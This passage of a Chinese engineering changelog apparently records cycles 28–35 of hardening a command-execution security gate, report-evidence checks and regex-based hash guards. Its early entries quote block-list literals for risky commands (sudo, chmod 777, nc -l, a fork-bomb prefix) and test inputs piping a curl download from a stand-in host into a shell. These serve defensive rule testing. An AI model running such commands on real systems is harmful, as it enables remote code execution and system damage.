- **D-G2（误导性归因，已修）**：策略拒绝被渲染为 `guardian . escapes runtime root .`（路径逃逸语义），再被适配器二次包成 `回测解释器被拒绝`——三重误归因，取证 agent 会去查不存在的路径逃逸 / 解释器白名单。修复：`ContainmentError` 增加 `detail`，`kind="guardian"` 单独渲染 `guardian policy denied ... (security gate; no path escape): <reason> (risk=x.xx)`；适配器按 kind 分流 `guardian_denied` / `interpreter_denied`。
- **D-G3（纵深防御退化，已修）**：`ToolPermission.resolve_risk` 只做**精确等值**匹配，而矩阵里的字面量是 `sudo ` / `chmod 777` / `nc -l` / `:(){`——真实命令永不等于它 ⇒ 声明的 **BLOCK 层形同虚设**，只剩启发式评分兜底（非可直接利用的洞）。修复：按文档语义——以 `*` 结尾 = 前缀，否则 = 子串。残余：`curl |` / `wget |` 字面量无法命中真实流水线（仍被模式扫描器拦下，行为不变，是否改写属安全策略决策）。
- **D-C1（并发首建库竞态，已修）**：干净 runtime root 上 4 个并发 `--once`，3 个以 `Config error: database migration required: v0/v2/v3 -> v5` 退出。根因：`PatternStore.__init__` 用 `exists() and size>0` 判断新库/旧库，竞态进程**先建文件、后提交 schema 账本** ⇒ 观察者读到 v0/v2/v3 即 fail-closed。修复：`_converge_after_concurrent_init()` 在「版本<目标且文件是新的」时短暂等待收敛；旧文件 / `auto_migrate=True` 语义不变。
- **A 轮（commit `a58bf55`，+26 用例）**：改动 6 个引擎文件；新增 `tests/test_guardian_gate.py`（16 用例：路径段 / BLOCK 层 / 诚实文案 / 适配器分流）与 `tests/test_store_first_init_concurrency.py`（4 用例：收敛 / 旧库拒绝 / 新鲜未版本化拒绝 / auto_migrate 不变）。
- **C/D**：实况 1642/78.73 → **1668/78.87**（+26 用例，coverage +0.14)；head `a281839` → **`a58bf55`**；唤醒指针指向 cycle-28 且『下一目标』标号同步到 §13.54；新增 `docs/design/2026-10-25-cycle28-A-guardian-gate-blindspot.md`。
- **压测交付（独立目录，机制外置）**：`<WORKSPACE_ROOT>\loop-test-output\loop-eval-20261025-fullstress`——`runner/T1..T7` 可复跑 + `artifacts/*.json` 机读 + `docs/README.md`(流程) + `docs/RESULTS.md`(结果与缺陷) + `MANIFEST.sha256`。T1 CLI 25/25、T2 端到端 7/7、T3 规模 5/5、T4 并发 3/3、T5 稳定 4/4、T6 安全矩阵 16 行（修复后 0 mismatch）、T7 WebUI 16/16。
- **D-S1（历史报告缺陷，已登记）**：2026-10-22 F9 探针把锁断言写成 `<repo>/sloth_engine/.loop.lock`，实际是 `<runtime.root>/.loop.lock`（无 `runtime:` 段时 = 仓根）⇒ 其不变量 I4「无残留锁」是**空断言**。与 D-G2 同族（*验证器必须被验证*；锁路径这类常量必须与实现单点对齐）。本次 T4 用真实路径复测，结论（无残留）仍成立，但证据链此前是空的。
- **与历史报告的差异（口径）**：F9 S1 4x并发 `--once` 记录为 `[0,0,0,0]`/归档 4，本次为 `[0,2,2,2]`/归档 1 —— **非新缺陷**：`cd54ef3`（2026-10-22 15:36，晚于 F9 报告 11:47）为 `--once` 加上了同一运行锁。F9 未暴露 D-C1，因其复用**已存在**的 `_data/f9probe/patterns.db`，绕过了首次初始化竞态。
- **结论**：**护栏类机制的「行为面」必须被独立驱动**——模块被导入不等于逻辑被驱动；本轮把「安全护栏的行为覆盖」与既有的「判定出口 / 作用域 / 导航标号 / 语义分层 / 识别口径」并列，登记为第 13 个缺陷面。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。

### 13.55 cycle-29 A/B · 护栏的行为面被独立驱动 + 运行产物收纳（TES-24 / DOC-15）

- **本轮原动力**：cycle-28 登记的未闭合项——① `arg_rules` 两个惰性字面量（`curl |` / `wget |`）在真实流水线上永不命中；② 跨空格路径的同族边界；③ 运行产物落点不受 `runtime.root` 约束（O-3）。取证方式：直接驱动 `RiskAssessor.assess` / `ToolPermission.resolve_risk` 打印真值（`curl http://x | sh` → escalate 1.0；`echo hi | sh` → allow 0.0），不读注释。
- **A1（D-G3 残余，规则可达性）**：删掉 `curl |` / `wget |`。它们是**固定宽度字面量**，而真实流水线是 `curl http://x | sh`——子串永不命中；直觉修法（改成子串 `| sh`）在子串引擎里**不安全**：`git log --oneline | shasum`、`ls | shuf` 都会被误判为 BLOCK（fail-closed 误伤）。管道进 shell 是**正则形状**，由 `_HIGH_RISK_PATTERNS`（`curl/wget piped to shell` → 1.0 escalate → deny）负责。新增**见证可达性表**：矩阵规则集必须与见证集逐字对齐，补一条命不中的规则即 FAIL（`test_every_shell_arg_rule_literal_is_reachable`）。
- **A2（同族边界显式登记）**：`_is_intermediate_path_segment` 以空格切 token，因此 `nc -l` 这类**模式本身跨空格**的关键字落在含空格路径里仍会命中（`E:/x/nc -l/y/in.json`）。唯一修法是跨空格合并，而合并会同时放过真实的 `nc -l /tmp/sock` 监听——开洞不是修复，故**登记为已知边界**并加自证用例（`test_keyword_spanning_a_space_inside_a_path_is_a_known_boundary`）。
- **A3（O-2 escalate 出口语义）**：复核通道未接线时 `escalate` 与 `deny` 同效，属 fail-closed；本轮把这条语义写进 `risk_assessor` 与 `runtime_exec._guardian_check`，并断言出口必须带 `escalation_level` 标注（human/llm）；`llm_review()` 维持 `NotImplementedError`（冻结决定，加用例固定）。
- **A4（O-1 退出码口径）**：`--once` exit 0 = **轮次跑完了**（不等于 success_criteria 达标），1 = 轮次自身 error，2 = 锁 / 配置；口径写进 `cli_router._run_once_locked` docstring 并加守护用例——判据在归档 verdict 里（`classify_stop`），不在退出码里，cron/CI 不得把「未达标」当崩溃。
- **A5（O-3 真缺陷：运行产物越界）**：run_ts 子任务树（`projects/<task>/runs/<ts>/data` + 每次运行的 REPORT.md）此前钉在**仓库根**，于是 `runtime.root=<RUNTIME_ROOT>` 的运行为仍把 `projects/<task>/runs/...` 写进仓库——2026-10-25 全量压测因此在仓库留下 ~50 个任务目录（`git status --ignored -- projects` 可见：`t1base` / `t3n100` / `f9conc` / `subt` …）。修法：运行产物一律随 `runtime.root`（`run_reporter._tree_root()`、`report_util.write_customer_report(runs_root=...)`、`run_state._claim_run_ts(root=...)`）；**带日期的客户报告树 `reports/<date>/REPORT.md` 仍按 §9.4 落项目规约目录**（那是交付物不是运行产物）；无 `runtime:` 段时默认 root 就是仓库，旧布局零变化。
- **A6（O-4 / O-5）**：Windows 无 `RLIMIT_NOFILE/RLIMIT_CPU`，`_posix_kwargs` 已注明 best-effort（登记不改）；锁路径新增**行为面**守护——`--once` 与长跑两个入口都必须把锁落在 `<runtime.root>/.loop.lock`（真 `CliRouter` + 真 `_RunLock` 驱动），并断言该表达式在源码里只有一种形状（D-S1 家族：任何取证 agent 不得引用第二条错路径）。
- **A 提交 `c725c84`（+14 用例）**：`tests/test_guardian_gate.py` 16 → 22 例；新增 `tests/test_runtime_artifact_containment.py`（8 例：归档树 / 每次运行报告 / 报告与归档同树 / `runs_root` 默认回退 / 默认 root 即仓库 / 双入口锁路径 / 锁路径单形状 / `--once` 退出码口径）；`test_cli_once_report` / `test_subtask_tree` / `test_backpressure_defer` 同步到新落点（后者把「事后清扫」改成「越界即 FAIL」）。
- **B（architect-skills）**：TES-24 + DOC-15 ——「**校验器家族**」第 13 个面：**安全护栏的行为面必须被独立驱动**（每条规则要有见证命令、allow/deny/escalate 三个出口分别断言、拒绝渲染必须对齐真实原因、已知边界必须是显式决定）；`validate-contracts.mjs` 19 atom / 0 错 / 0 警，`run-l1-tests.mjs` 32 passed，跨仓账本 `unexplained 0 / exit 0`。
- **C/D**：实测 1668/78.87 → **1682/79.11**（+14 用例，coverage +0.24）；head `a58bf55` → **`c725c84`**；唤醒指针指向 cycle-29，「下一目标」标号同步到 §13.55；新增 `docs/design/2026-10-25-cycle29-A-guardian-reachability-and-artifact-containment.md`。
- **未闭合项（顺延）**：N-3 / R3（真实厂商额度源 / 真实模型 24h soak，需挂载主机）维持 blocked；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱不做；低优先 ❌错记：本节原写「`tool_registry.dispatch` 主路径 65%、`tool_concurrency` 0%（EXEMPT）不变」，实为 **cycle-16 A 已闭合**（`tool_registry.py` 65%→100%、`tool_concurrency.py` 0%→100%，见 §13.40；后者仍是 orphan-gate 显式豁免＝无生产调用方，但契约已有 19 例覆盖）。
- **验收**：`pytest tests sloth_engine/tests -q` → 1682 passed / 1 xfailed / 79.11%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`tests/test_wake_pointer_chain.py` 全绿；B 侧三命令全绿。

### 13.56 cycle-30 A/B · 产出的证据引用必须在写出时解析到真实文件：TES-25 / DOC-16

- **本轮原动力**：用户指令「全面开始修复 使用大任务循环」。全量单测 1682/79.11% 与 cycle-1..29 的既有压测全绿，但在收尾 2026-10-25 全量压测交付目录（`loop-test-output/loop-eval-20261025-fullstress`）时，顺 `--report` 只读面取证：`--report` 为此在仓库里写出了带日期客户报告，而报告 §2 的六条 `file:line:` 证据**全部指向报告旁根本不存在的 `data/`**。同族缺陷第 14 个面：**交付物写出的证据引用从未被「存在性」校验**（cycle-23 判决出口 / cycle-24 判定集合 / cycle-25 导航标号 / cycle-26 语义分层 / cycle-27 识别口径 / cycle-29 行为面 / 本轮 证据落点）。
- **D-R1（证据断链 + 自校验失明，已修）**：`projects/<task>/reports/<date>/REPORT.md`（`--report` / `write_customer_report(run_ts=None)`）的 §2 六行证据全写成 `file:line: data/<name>.json:1`，而报告旁从不写 `data/`（快照在 `<runtime>/projects/<task>/runs/<ts>/data`）；报告内自校验 `validate_risk_evidence` 只 grep `ref:`/`file:line:` **字面标签**，对断链 100% 失明 ⇒ 报「干净」。取证 agent 会被送到不存在的文件。
  - **根因**：`RunReporter` 非 run_ts 分支把 `data_dir` 算成 `<runtime.events_dir>/<run_id>`（归档从不创建该路径），相对化后得 `..\runs\<run_id>`，再被 `except ValueError` 兜成字面量 `data` —— 一个**编造的**引用前缀。
  - **A 修复（commit `852fb84`，+10 用例）**：① `validate_risk_evidence` 增加存在性校验（对报告目录 + 仓根双锚点解析；无锚点则不判，保持旧行为）；② 生产端不再写出无法背书的 `data/<x>.json`——引最新归档快照（相对，跨盘则绝对），否则自引 `REPORT.md`（`SELF_CITE`）；③ `run_reporter` dated 分支引 `<runtime>/projects/<task>/runs/*/data` 下最新归档快照。新增 `tests/test_dated_report_refs.py`（10 例）。
  - **边界（刻意）**：dated `reports/<date>/REPORT.md` 是**交付物**，按 §9.4 落项目规约目录（在仓内），是 cycle-29 A 登记过的 `runtime.root` 例外；本轮只纠正它写出的引用，不搬迁交付物。
- **B 轮（architect-skills commit `2205ce0`）**：`architect-test` 24→**25**（TES-25）、`architect-docs` 15→**16**（DOC-16）——「产出的证据引用必须在写出时解析到真实文件；无同目录快照必须自引；产物自带自校验必须校验**存在性**且需传入解析锚点（只匹配标签＝对断链失明）」；`validate-contracts.mjs` → 19 atom / 0 错 / 0 警、`run-l1-tests.mjs` → 32 passed、跨仓账本 `unexplained 0 / exit 0`。
- **压测交付收尾（同轮）**：`loop-test-output/loop-eval-20261025-fullstress/docs/README.md` 被上一轮补丁脚本整段覆盖（只剩 §6.1），与 `RESULTS.md` 头部「判定口径见 `README.md` §5」的引用断链（D-S1 同族）——已据 `runner/` + `RESULTS.md` 重写 README（恢复 §1–§6），并把 `MANIFEST.sha256` 重建、45/45 全对（排除 `runtime/`、`__pycache__`、`*.pyc`、自身）。
- **C/D**：实测 1682/79.11 → **1692/79.17**（+10 用例，coverage +0.06）；head `c725c84` → **`852fb84`**；唤醒指针指向 cycle-30，「下一目标」标号同步到 §13.56；新增 `docs/design/2026-10-25-cycle30-A-evidence-refs-must-resolve.md`。
- **残余边界**：① 报告内自校验只在**写出时**跑（读回旧报告不会补校验）；② `_latest_archive_data_dir` 取 `runs/*/data` 最新一个，同 run 多次归档只引最后一次；③ 跨盘快照写成绝对路径（可移植性下降，但至少不编造）。
- **未闭合项（顺延）**：N-3 / R3（真实厂商额度源 / 真实模型 24h soak，需挂载主机）维持 blocked；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱不做；低优先 ❌错记：本节原写「`tool_registry.dispatch` 主路径 65%、`tool_concurrency` 0%（EXEMPT）不变」，实为 **cycle-16 A 已闭合**（`tool_registry.py` 65%→100%、`tool_concurrency.py` 0%→100%，见 §13.40；后者仍是 orphan-gate 显式豁免＝无生产调用方，但契约已有 19 例覆盖）。
- **结论**：**产出的证据引用必须在写出时解析到真实文件**——「我引用了 `data/x.json`」与「`data/x.json` 存在」是两件事；把引用写成约定的常量前缀、自校验只匹配标签，等于给下游伪造了一条永远走不到的路径。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。
- **验收**：`pytest tests sloth_engine/tests -q` → 1692 passed / 1 xfailed / 79.17%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`tests/test_wake_pointer_chain.py` 全绿；B 侧三命令全绿。

### 13.57 cycle-31 A/B · 识别器的每个语法定点必须收敛为单一常量、且不窄于现实：TES-26 / DOC-17

- **本轮原动力**：cycle-27 登记的候选「守卫的语法定点仍窄于现实」——cycle-27 统一了哈希**字母表**（7..40）并让 CLAIM_RE 认全角括号，但同一个类里剩下的定点（括号类、前缀）留在原地。取证方式：不看注释，直接把一条链条目改成全角括号、并把它的 cycle 标注写错，观察守卫是否变红。
- **红证据（实测）**：`ENTRY_RE` 只认 ASCII 括号 ⇒ 全角括号的链条目被 `chain_entries` **静默丢弃**——entries 仍为 56、`chain_violations` 仍为 `[]`（一条「cycle 标注写错」的链记录不可见；同样写法下的错哈希也不可见）。同族第二处：`HEAD_PREFIX` 同时写在 `HEAD_RE` 的内联字面量与测试常量里（两处真相，D-S1 家族）。
- **A 修复（commit `f4dd5e7`，+5 用例）**：① `BOPEN` / `BCLOSE` 收成单常量，`ENTRY_RE` 与 `CLAIM_RE` 共用（全角 / 半角括号同宽）；② `HEAD_PREFIX` 单点定义，`HEAD_RE` 由 `re.escape(HEAD_PREFIX)` 构造；③ 唤醒指针新增**唯一性**断言（第二个「代码 head <hash>」现在 FAIL，此前只比对第一个）；④ 把「哈希旁的逗号 / 破折号 + cycle-N 不是机器声明」钉死为**已决定的边界**（扩宽会把散文「截至 cycle-N」读成声明 ⇒ 误报；cycle-19/20 已定「只有括号形态是机器声明」）并用负例固定。测试 44 → 49 例。
- **B 轮（architect-skills commit `f6dfebb`）**：`architect-test` 25→**26**（TES-26）、`architect-docs` 16→**17**（DOC-17）——「识别器的全部语法定点（字母表 / 括号类 / 前缀 / 分隔符）必须收敛为单一常量并被所有识别器共用、且不窄于它审计的现实；不被覆盖的形态必须是被负例钉死的决定；要求唯一的记录必须断言『恰好一条』」；`validate-contracts.mjs` → 19 atom / 0 错 / 0 警、`run-l1-tests.mjs` → 32 passed、跨仓账本 unexplained 0 / exit 0。
- **C/D**：实测 1692/79.17 → **1697/79.17**（+5 用例，coverage 持平）；head `852fb84` → **`f4dd5e7`**；唤醒指针指向 cycle-31，「下一目标」标号同步到 §13.57；新增 `docs/design/2026-10-25-cycle31-A-recogniser-syntax-constants.md`。
- **残余边界（登记）**：① 链条目 / 声明的**分隔符**只认括号形态（逗号 / 破折号形不校验 cycle 一致性，但哈希本身仍受存在性规则管辖）——已用负例钉死为决定；② `ENTRY_RE` 仍要求哈希**带反引号**（裸哈希的链条目走 `_bare_git_context_tokens` 的同行 git 上下文门控）；③ `HEAD_RE` 的前缀仍是本仓约定写法（换了前缀会 fail-closed 报「无法定位指针」，不是静默绿）。
- **未闭合项（顺延）**：N-3 / R3（真实厂商额度源 / 真实模型 24h soak，需挂载主机）维持 blocked；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱不做；低优先 `tool_registry.dispatch` / `tool_concurrency` 已于 cycle-16 闭合（见 §13.56 的更正）。
- **结论**：**「一个定点，一个常量」**——守卫的每一处语法定点（字母表、括号、前缀、分隔符）都是一条独立的漂移入口；只要它窄于现实，记录就会**消失**而不是报红。本条把 cycle-27 的「字母表」推进到「全部语法定点」，并要求「不被覆盖的形态必须是决定」。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。
- **验收**：`pytest tests sloth_engine/tests -q` → 1697 passed / 1 xfailed / 79.17%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`tests/test_wake_pointer_chain.py` 49 例全绿；B 侧三命令全绿。

### 13.58 cycle-32 A/B · 缺陷豁免必须窄于它豁免的缺陷——标记只豁免它标注的那个 token：TES-27 / DOC-18

- **本轮原动力**：cycle-31 登记的候选「`_is_defect_line` 整行豁免宽于缺陷」。取证方式：写一行「普通英文词 phantom + 一个解析不出的 7 位 hex」，观察守卫是否报红——它不报。
- **红证据（实测）**：`_is_defect_line()` 只要行内出现任一 `DEFECT_MARKERS` 词就**整行豁免**，而其中一个「标记」是普通英文词 `phantom`——正是本模块自己的函数名 `phantom_hash_problems`。于是一句仅仅提到该函数名的注释就豁免了整行：同一条含幽灵哈希的行，带 phantom 一词时报 0 违规，去掉该词后立刻报「resolves in no known repo」。全仓 53 行仅靠这个词免检（其中无一行藏有坏哈希 ⇒ 潜伏假阴性，不是现行错值）。
- **A 修复（commit `9ba0b5f`，+8 用例）**：① `DEFECT_MARKERS` 收敛为纯**写作约定**（❌ / 错记 / NOT-A-COMMIT），代码标识符永不充当标记；② 豁免改为**按 token**：标记须在 token 之前且相距 ≤ `MARK_WINDOW`(24)；③ 枚举是一个槽位：以斜杠连接的哈希列表，仅当**首项**被标注才整列豁免；④ 行级豁免**记账化**：`ROW_MARKED_RULES` 显式登记 cycle-22 台账表格行，守卫断言登记仍存在、仍生效、不外溢到别的文件（登记不可静默腐坏，cycle-23 同族）；⑤ `classify_finding` / `classify_document` 同步按 token 判定。测试 49 → 57 例。阈值 24 由语料实测分界线给出：真正标注距被标注 token 2..15 字符，最宽的散文 / 表格间隔 25..63。
- **B 轮（architect-skills commit `a0877f2`）**：`architect-test` 26→**27**（TES-27）、`architect-docs` 17→**18**（DOC-18）——「豁免 / 白名单 / 例外类机制必须窄于它豁免的缺陷：标记须来自穷尽枚举（不得是代码标识符 / 普通词）、须紧邻被标记物、列表仅首项被标注才整体豁免；无法紧邻的行级形态必须显式登记，守卫断言登记仍存在 / 仍生效 / 不外溢」；`validate-contracts.mjs` → 19 atom / 0 错 / 0 警、`run-l1-tests.mjs` → 32 passed、跨仓账本 unexplained 0 / exit 0。
- **C/D**：实测 1697/79.17 → **1705/79.18**（+8 用例，coverage +0.01）；head `f4dd5e7` → **`9ba0b5f`**；唤醒指针指向 cycle-32，「下一目标」标号同步到 §13.58；新增 `docs/design/2026-10-25-cycle32-A-defect-exemption-scope.md`。
- **残余边界（登记）**：① 斜杠列表的整体豁免只在「同一行的 / 连接」形态成立（其它分隔符的枚举须走行级登记）；② 行级豁免按（路径 + 行 stem）登记，文件重命名 / stem 改写会让守卫报警（fail-closed，不是静默绿）；③ 阈值 24 是语料实测的分界线，语料若出现更宽的**合法**标注形态，须显式登记而不是调宽窗口。
- **未闭合项（顺延）**：N-3 / R3（真实厂商额度源 / 真实模型 24h soak，需挂载主机）维持 blocked；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱不做；低优先 `tool_registry.dispatch` / `tool_concurrency` 已于 cycle-16 闭合。
- **结论**：**豁免必须窄于它所豁免的缺陷**——「整行豁免 + 普通词当标记」会让真缺陷以假阴性通过，而产物看起来仍然干净。标记必须是穷尽的写作约定、只豁免它标注的对象、且任何例外都必须被登记。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。
- **验收**：`pytest tests sloth_engine/tests -q` → 1705 passed / 1 xfailed / 79.18%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`tests/test_wake_pointer_chain.py` 57 例全绿；B 侧三命令全绿。

### 13.59 cycle-33 A/B · 门控的触发条件必须不窄于它识别的声明——紧邻性，而非共现性：TES-28 / DOC-19

- **本轮原动力**：cycle-32 登记的候选「豁免类机制的方向性对称面」。cycle-32 修的是「豁免太宽」（把真缺陷放过）；本轮修它的镜像——「**门控太窄**」（把真声明漏掉）。
- **红证据（实测）**：`_bare_git_context_tokens()` 只在「同一行已有可解析提交引用」时才检查裸哈希（cycle-21 的共现门控）。于是一行仅仅写「fixed in commit <坏哈希>」（该行没有别的引用）**从不报红**——门控决定「要不要看」，而它看开了。这正是用户关心的「照链取证的 agent 拿到错哈希、并被当成事实一路传递」。
- **A 修复（commit `7eabdb3`，+3 用例）**：① 新增 `GIT_ADJACENT_RE`——git 关键词（commit / HEAD / baseline / tag / revision / sha …）**紧邻**其后的裸 token 本身就是声明；② `_bare_git_context_tokens` 改为「共现 **或** 紧邻」；放宽由**紧邻性**（局部、可实测）定义，绝不用**共现性**（全局、会漏）；③ 三仓语料实测：新增 **4 处命中，全部是真提交引用、误报 0**（全 hex 英文词 / 数据指纹 / 运行 id 从不紧邻关键词）；④ 其余 3 处命中即 architect-skills 早已登记的 amend 中转提交；唯一的 legacy 冻结期 HEAD 引用（任何克隆都不存在）按既有约定登记进 `REGISTERED_UNRESOLVABLE` 并附收据。测试 57 → 60 例。
- **B 轮（architect-skills commit `b586796`）**：`architect-test` 27→**28**（TES-28）、`architect-docs` 18→**19**（DOC-19）——「门控 / 触发条件 / 前置过滤必须不窄于它识别的声明；不能因『缺少旁证』把唯一的、形态上明确的声明漏掉；放宽必须用紧邻性（局部、可实测）而不是共现性（全局、会漏）定义；每个放宽都要用语料实测证明零误报；门控要有正例 + 负例双向测试」；`validate-contracts.mjs` → 19 atom / 0 错 / 0 警、`run-l1-tests.mjs` → 32 passed、跨仓账本 unexplained 0 / exit 0。
- **C/D**：实测 1705/79.18 → **1708/79.17**（+3 用例；coverage 微降 0.01 系新增门控分支语句所致，仍在 fail_under 70 之上、且落在 run_gate 棘轮容差内）；head `9ba0b5f` → **`7eabdb3`**；唤醒指针指向 cycle-33，「下一目标」标号同步到 §13.59；新增 `docs/design/2026-10-25-cycle33-A-gate-trigger-not-narrower.md`。
- **残余边界（登记）**：① 紧邻性由 `GIT_ADJACENT_RE` 的关键词集定义（commit / HEAD / baseline / tag / revision / sha / merge）——新增关键词须同时补实测（0 误报）与用例；② 带摘要标签（md5=…）的行仍整体跳过（cycle-21 的决定，未变）；③ 登记表条目由反腐坏测试守护（一旦 token 开始可解析即报警）。
- **未闭合项（顺延）**：N-3 / R3（真实厂商额度源 / 真实模型 24h soak，需挂载主机）维持 blocked；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱不做；低优先 `tool_registry.dispatch` / `tool_concurrency` 已于 cycle-16 闭合。
- **结论**：**门控的触发条件必须不窄于它识别的声明**——「先判断值不值得看」的门控一旦窄于声明，就会把唯一的、形态上明确的记录漏掉，而产物看起来仍然干净（假阴性）。放宽只能用**紧邻性**（局部、可实测）定义，并必须用语料实测证明零误报。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。
- **验收**：`pytest tests sloth_engine/tests -q` → 1708 passed / 1 xfailed / 79.17%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`tests/test_wake_pointer_chain.py` 60 例全绿；B 侧三命令全绿。

### 13.60 cycle-34 A/B · 开关的作用域不得大于它豁免的对象——摘要标签只豁免它标注的那个值：TES-29 / DOC-20

- **本轮原动力**：cycle-33 登记的候选「带摘要标签的行仍整体跳过」（`_bare_git_context_tokens` 的整行跳过）。取证方式：把一行「git 关键词 + 坏哈希」与一个 `md5=` 标签写在同一条线上，观察守卫是否报红——它不报。
- **红证据（实测）**：`DIGEST_ANY_RE` 命中即让裸哈希扫描**整行返回空**（cycle-21 的整行跳过）。摘要标签的本意是「这个值是校验和，不是提交引用」，作用域应只是**它标注的那个值**；于是一行「fixed in commit <坏哈希>, md5=<摘要>」里的真提交声明**从不报红**——正是用户关心的「照链取证的 agent 拿到错哈希、并被当成事实一路传递」。本仓出货 markdown 中带摘要标签的行 13 行，其中被整行跳过掩盖的裸 token **0** ⇒ 与 cycle-32 的 53 行同族，是**潜伏洞**（零现行错值、零回归）。
- **A 修复（commit `706df02`，+4 用例）**：① 新增 `_digest_labelled`——摘要标签只豁免它**紧邻标注的那个值**（标签须落在前缀末尾，`DIGEST_LABEL_RE` 锚定在行尾）；② 反引号识别器与裸识别器**共用**该单点谓词（此前反引号路径自带一份等价但分离的判断，裸路径则整行一刀切——两处真相，D-S1 家族）；③ 移除整行跳过，`_bare_git_context_tokens` 只把未被标签标注的裸 token 纳入候选；④ 分类器口径不动并钉死为「有意更宽」（行级证据可解释门禁会报的 token——只放宽取证报告，绝不放宽出货门禁）。测试 60 → 64 例。
- **B 轮（architect-skills commit `6665a2a`）**：`architect-test` 28→**29**（TES-29）、`architect-docs` 19→**20**（DOC-20）——「开关 / 豁免标签的作用域不得大于它豁免的对象：一个只该豁免某个值的标签不得关掉整行 / 整块的检查；作用域必须按**对象**定义、由语料实测给出分界线并配负例；标签判定须收敛为**单点谓词**被所有识别器共用；分类器可以有意更宽，但该不对称必须作为决定钉死」；`validate-contracts.mjs` → 19 atom / 0 错 / 0 警、`run-l1-tests.mjs` → 32 passed、跨仓账本 unexplained 0 / exit 0。
- **C/D**：实测 1708/79.17 → **1712/79.17**（+4 用例，coverage 持平）；head `7eabdb3` → **`706df02`**；唤醒指针指向 cycle-34，「下一目标」标号同步到 §13.60；新增 `docs/design/2026-10-25-cycle34-A-digest-label-scope.md`。
- **残余边界（登记）**：① 分类器仍是行级口径（有意比门禁更宽），该不对称已用用例钉死；② 豁免锚定在值本身——仅「靠近」标签的 token 不受保护；③ 标签后无 hex 值时不豁免任何东西（无对象可豁免）。
- **未闭合项（顺延）**：N-3 / R3（真实厂商额度源 / 真实模型 24h soak，需挂载主机）维持 blocked；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱不做；低优先 `tool_registry.dispatch` / `tool_concurrency` 已于 cycle-16 闭合。
- **结论**：**开关的作用域不得大于它豁免的对象**——一个只该豁免某个值的标签一旦关掉整行的检查，真声明就会以假阴性通过，而产物看起来仍然干净。作用域必须按对象定义，并由语料实测给出分界线。至此「宽窄不对称」族的三轴（cycle-32 值 / cycle-33 触发 / cycle-34 作用域）全部闭合。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。
- **验收**：`pytest tests sloth_engine/tests -q` → 1712 passed / 1 xfailed / 79.17%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`tests/test_wake_pointer_chain.py` 64 例全绿；B 侧三命令全绿。

### 13.61 cycle-35 A/B · 「受门控 / 已覆盖」必须由登记证明，不是按名字：TES-30 / DOC-21

- **本轮原动力**：cycle-34 收尾时复核「守卫族之外还有没有同类问题」，把镜头转向**不变量 1（ExecGate 单点出口，F1）**——它长期 xfail，但从未有人质疑它的**判定方式**。
- **红证据（实测）**：`_unguarded_spawns` 的豁免是**名字级**的：被测函数里只要出现 gate / ExecGate / _gate / assert_interpreter 任一名字，该 spawn 站点即整条豁免。探针：一个只把 gate 当参数、并在日志里提了一句的函数，裸 `subprocess.run` 照样通过（与 cycle-32 同族：豁免宽于它豁免的对象，只是对象换成了**不变量自己**）。更要命的是这条规则**在掩盖真绕过**：`adapters/backtest_adapter.py` 的「if exec_gate is not None … else: subprocess.run(...)」无门回退 ×3、`ooda_pipeline.py` 的 callback / regression 裸 `sp.run` ×2，全部「按名字变绿」；而 xfail 文案只截断显示前 4 行（其中 3 行还是宿主工具 run_gate / audit），规模被低估。另：`_PY_FILES` 用 `rglob`，把 gitignore 的 `scripts/tmp/**` 临时脚本也算进「业务代码」，判定结果取决于本机残留垃圾。
- **A 修复（commit `eb788b1`，+5 用例）**：① 取样域改为 git 跟踪 + 待提交的 `.py`（与文档守卫同款 `ls-files`），排除归档 / 临时；② 删除名字级豁免，改为**登记式**——`SPAWN_SANCTIONED`（仅 `runtime_exec.py` = 门实现）+ `SPAWN_OUTSIDE_GATE`（`self_modify_gate` 自举理由、`run_gate` / `audit_cross_repo_ledger` 宿主工具理由），每条登记必须**仍命中**一个真站点，否则 FAIL（登记不可静默腐坏，cycle-23 家族）；③ 违规报告不再截断（给出条数 + 全部行）；④ MCP 服务端 spawn 真接门——`MCPClient(gate)` 经 `ExecGate.popen` 启动（守护检查 / 解释器白名单 / scrub_env / 输出上限），**无 gate 拒绝启动**（fail-closed），gate 在 `plugin_bootstrap` 的 `build_host` / `_register_mcp_tools` / `load_global_host` 逐层透传。新增 5 例：名字级豁免必须失效 / 登记必须仍生效 / 取样域不得含垃圾与归档 / MCP 必须经门 / 无门必须拒绝。
- **B 轮（architect-skills commit `85b312b`）**：`architect-test` 29→**30**（TES-30）、`architect-docs` 20→**21**（DOC-21）——「受控 / 已受门控 / 已覆盖」这类**范围性**不变量，判定必须以**站点 / 文件的显式登记**为对象（不得按名字）；**取样域**必须与声称的域一致；每条登记必须**仍生效**；违规报告不得**截断**；自证 = 只提到门名字的函数 + 裸调用必须变红、登记失效必须报警。文档侧：宣称「已受控 / 已覆盖」必须附**可核对证据**（登记表 / 断言 / 检查产物）并完整列出规模、写清扫描域；`validate-contracts.mjs` → 19 atom / 0 错 / 0 警、`run-l1-tests.mjs` → 32 passed、跨仓账本 unexplained 0 / exit 0。
